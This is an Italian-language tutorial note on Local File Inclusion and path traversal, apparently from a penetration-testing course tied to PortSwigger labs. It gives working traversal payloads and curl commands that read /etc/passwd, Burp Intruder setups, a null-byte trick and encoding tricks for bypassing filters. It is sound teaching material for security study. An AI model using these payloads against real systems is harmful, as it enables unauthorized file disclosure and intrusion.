# LFI Basics

**Difficolta:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [02-Scanning-Enumeration/03-Web-Enumeration.md](../02-Scanning-Enumeration/03-Web-Enumeration.md)
**Lab:** PortSwigger Academy — Path Traversal

---

## Obiettivo

Sfruttare parametri che caricano file lato server (`?page=`, `?file=`, `?template=`) per leggere file arbitrari sul filesystem: e spesso il primo passo verso RCE (vedi [Wrappers-PHP.md](Wrappers-PHP.md) e [LFI-Advanced.md](02-LFI-Advanced.md)).

---

## Concetti chiave

### Dove cercare LFI

Qualsiasi parametro che sembra riferirsi a un file/path e candidato:
```
?page=about.php
?file=report.pdf
?template=header
?lang=en
?include=footer
```

### Path traversal

```
../  ->  sale di una directory
```
Ripetuto piu volte porta alla root del filesystem, da cui si naviga verso file noti come `/etc/passwd`.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| curl | `curl "URL?page=../../../etc/passwd"` | contenuto file | manuale, sempre parti da qui |
| Burp Intruder | payload list di traversal | risposte comparabili | utile per trovare profondita corretta |
| ffuf | fuzzing profondita traversal | risposte comparabili | automatizza il tentativo di piu `../` |

---

## Payload / Esempi

### Esempio 1: path traversal classico

**Setup:**
- Target: applicazione PHP con `?page=`
- Vulnerability: LFI senza sanitizzazione

**Step-by-step:**
```bash
curl "http://target.com/index.php?page=../../../../../../etc/passwd"
curl "http://target.com/index.php?page=....//....//....//etc/passwd"
curl "http://target.com/index.php?page=/etc/passwd"
```

**Output atteso:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Spiegazione:** il numero di `../` deve superare la profondita della directory corrente; se non sai la profondita esatta, ripeti la sequenza molte volte (i `../` in eccesso oltre la root vengono ignorati dal filesystem).

### Esempio 2: trovare la profondita corretta con Burp Intruder

```
Payload position: ?page=§../§../../../etc/passwd
Payload list: 1,2,3,4,5,6,7,8,9,10 ripetizioni di "../"
```

**Spiegazione:** automatizzare il numero di traversal risparmia tempo rispetto a tentativi manuali uno a uno.

### Esempio 3: null byte (sistemi PHP < 5.3.4, raro oggi ma da conoscere)

```
?page=../../../etc/passwd%00
```

---

## Evasion / Bypass Techniques

### Bypass filtro che rimuove "../" una sola volta

```
....//....//....//etc/passwd
..././..././..././etc/passwd
```

### Encoding del traversal

```
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   (double URL encoding)
```

### Bypass whitelist di estensione (append forzato)

Se l'app forza `.php` alla fine del path, usare i wrapper (vedi [Wrappers-PHP.md](Wrappers-PHP.md)) o un null byte su sistemi vecchi.

---

## Lab Hands-On

### Lab 1: PortSwigger — File path traversal, simple case
**Obiettivo:** leggere `/etc/passwd` tramite parametro vulnerabile
**Difficulty:** Facile
**Time:** 20 min

**Walkthrough breve:**
1. Identifica il parametro che carica file
2. Prova traversal diretto
3. Se filtrato, prova encoding/doppio encoding

---

## Common Mistakes

- Fermarsi al primo tentativo di `../../etc/passwd` senza variare la profondita -> prova sempre un range di ripetizioni
- Dimenticare l'encoding quando il traversal diretto viene filtrato -> molti WAF/filtri bloccano solo la stringa letterale `../`
- Non pensare ai file Windows (`..\..\windows\win.ini`) se il target e IIS/ASP

---

## Link Utili

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Academy — Path Traversal](https://portswigger.net/web-security/file-path-traversal)

---

## Connessioni

- **Prerequisito:** [02-Scanning-Enumeration/03-Web-Enumeration.md](../02-Scanning-Enumeration/03-Web-Enumeration.md)
- **Prossimo Step:** [02-LFI-Advanced.md](02-LFI-Advanced.md)
- **Combinazione con:** [Wrappers-PHP.md](Wrappers-PHP.md)

---

## Checklist di padronanza

- [ ] So identificare parametri candidati a LFI
- [ ] So costruire path traversal con profondita variabile
- [ ] Conosco almeno 3 tecniche di encoding per bypassare filtri base
- [ ] Ho letto con successo /etc/passwd su un lab

---

## Note personali

_(spazio libero)_
